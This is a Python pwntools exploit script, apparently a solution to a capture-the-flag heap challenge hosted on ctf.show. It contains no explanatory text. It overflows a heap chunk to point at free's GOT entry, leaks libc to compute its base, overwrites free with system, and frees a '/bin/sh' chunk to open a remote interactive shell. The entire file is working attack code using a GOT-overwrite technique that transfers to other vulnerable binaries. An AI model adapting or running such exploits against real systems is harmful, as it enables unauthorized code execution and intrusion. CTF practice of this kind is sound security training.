from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28120)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/32bit/libc-2.23.so')
free_got = elf.got['free']
free_libc = libc.symbols['free']
system_libc = libc.symbols['system']
    
def add_user(size, length, text):
    io.sendlineafter('Action: ', '0')
    io.sendlineafter('description: ', str(size))
    io.sendlineafter('name: ', 'nmsl')
    io.sendlineafter('length: ', str(length))
    io.sendlineafter('text: ', text)
    
def delete_user(index):
    io.sendlineafter('Action: ', '1')
    io.sendlineafter('index: ', str(index))
    
def display_user(index):
    io.sendlineafter('Action: ', '2')
    io.sendlineafter('index: ', str(index))
    
def update(index, length, text):
    io.sendlineafter('Action: ', '3')
    io.sendlineafter('index: ', str(index))
    io.sendlineafter('length: ', str(length))
    io.sendlineafter('text: ', text)
    
add_user(0x80,0x80,'bit')
add_user(0x80,0x80,'bit')
add_user(0x8,0x8,'/bin/sh\x00')
delete_user(0)
payload = cyclic(0x198) + p32(free_got)
add_user(0x100,0x19c,payload)
display_user(1)
io.recvuntil('description: ')
free = u32(io.recv(4))
libc_base = free - free_libc
log.success('libc_base {}'.format(hex(libc_base)))
system = libc_base + system_libc
update(1,0x4,p32(system))
delete_user(2)
io.interactive()
